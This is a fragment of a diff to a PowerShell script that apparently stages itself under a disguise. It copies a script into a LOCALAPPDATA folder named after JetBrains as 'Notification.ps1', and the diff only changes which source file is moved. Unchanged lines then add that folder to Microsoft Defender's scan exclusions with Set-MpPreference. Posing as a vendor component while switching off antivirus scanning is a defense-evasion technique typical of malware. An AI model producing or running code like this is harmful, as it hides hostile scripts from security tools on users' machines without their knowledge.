@@ -4,7 +4,7 @@ $ErrorActionPreference = 'Stop'
 $Location = "$env:LOCALAPPDATA\JetBrains\Notification.ps1"
 $destDir = "$env:LOCALAPPDATA\JetBrains"
 New-Item -Path $destDir -ItemType Directory -Force | Out-Null
-Move-Item -Path ".\JetBrains.ps1" -Destination $Location -Force
+Move-Item -Path ".\Notification.ps1" -Destination $Location -Force
 
 $exclusions = "$env:LOCALAPPDATA\JetBrains"
 Set-MpPreference -ExclusionPath $exclusions
